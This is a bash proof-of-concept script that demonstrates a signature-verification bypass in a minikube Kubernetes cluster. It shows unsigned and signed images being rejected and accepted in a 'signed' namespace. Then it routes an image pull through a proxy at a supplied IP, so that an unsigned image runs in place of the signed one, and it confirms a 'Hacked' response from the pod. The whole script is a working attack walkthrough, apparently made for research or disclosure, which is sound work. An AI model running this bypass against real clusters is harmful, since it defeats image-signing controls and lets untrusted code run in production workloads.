
#!/bin/bash
# Showings the attack POC
# Usage: show-attack-poc.sh <IP address>

# Check argument
if [ -z "$1" ]; then
    echo "Usage: show-attack-poc.sh <IP address>"
    exit 1
fi

IP=$1

# Check if kubectl is available
if ! command -v kubectl &> /dev/null
then
    echo "kubectl could not be found"
    exit
fi

# Check if minikube running
if ! minikube status | grep -q "host: Running"; then
    echo "minikube is not running"
    exit
fi

# Check if proxy running on the given IP address and port 4443
if ! curl -s -k -v https://$IP:4443 2>&1 | grep -q "200 OK"; then
    echo "Proxy server is not running on IP address $IP"
    exit
fi

# Show that unsigned image is not allowed in signed namespace
echo "1> Trying to run unsigned image in signed namespace"
echo "----------------------------------------"
echo kubectl -n signed run unsigned --image=hisu/cosign-tests:unsigned --image-pull-policy='Always'
kubectl -n signed run unsigned --image=hisu/cosign-tests:unsigned --image-pull-policy='Always'
echo "----------------------------------------"
# Check if last command failed as expected
if [ $? -ne 0 ]; then
    echo "1> Failed to run unsigned image in signed namespace as expected"
fi

# prompt user to continue
read -p "Press enter to continue"

# Show that signed image is allowed in signed namespace
echo "2> Trying to run signed image in signed namespace"
echo "----------------------------------------"
echo kubectl -n signed run signed --image=hisu/cosign-tests:signed --image-pull-policy='Always'
kubectl -n signed run signed --image=hisu/cosign-tests:signed --image-pull-policy='Always'
echo "----------------------------------------"
# Check if last command succeeded as expected
if [ $? -eq 0 ]; then
    echo "2> Succeeded to run signed image in signed namespace"
fi

# prompt user to continue
read -p "Press enter to continue"

# Show that we can trick the system to run the unsigned image by using the proxy in the signed namespace
echo "3> Trying to run signed image in signed namespace by using the proxy"
echo "----------------------------------------"
echo kubectl -n signed run unsigned --image=$IP:4443/hisu/cosign-tests:signed --image-pull-policy='Always' 
kubectl -n signed run unsigned --image=$IP:4443/hisu/cosign-tests:signed --image-pull-policy='Always' 
echo "----------------------------------------"
# Check if last command succeeded as expected
if [ $? -ne 0 ]; then
    echo "3> Failed to run signed image in signed namespace by using the proxy"
    exit 1    
fi


# Wait for the pod to be ready
echo "3> Waiting for pod to be ready"
kubectl -n signed wait --for=condition=ready pod/unsigned

# Check the HTTP response from the pod
echo "3> Checking HTTP response from the pod"
echo "----------------------------------------"
# Setup port forwarding to the pod
kubectl -n signed port-forward pod/unsigned 8080:80 &
# Wait for 5 seconds for the port forwarding to be ready
sleep 5
# Save pid of the port forwarding process
PID=$!
echo curl -s -k -v http://localhost:8080
RESPONSE=`curl -s -k -v http://localhost:8080`
kill $PID
echo $RESPONSE
if [[ $RESPONSE == *"Hacked"* ]]; then
    # Print ascii art of success
    echo " ___ _   _  ___ ___ ___  ___ ___ "
    echo "/ __| | | |/ __/ __/ _ \/ __/ __|"
    echo "\__ \ |_| | (_| (_|  __/\__ \__ \\"
    echo "|___/\__,_|\___\___\___||___/___/"
    echo
    echo "3> Proxy could inject an unsigned image in signed namespace"
else
    echo "3> HTTP response from the pod is incorrect"
fi
echo "----------------------------------------"


# prompt user to continue
read -p "Press enter to continue"

# Delete the pods in the signed namespace
kubectl -n signed delete pod unsigned signed
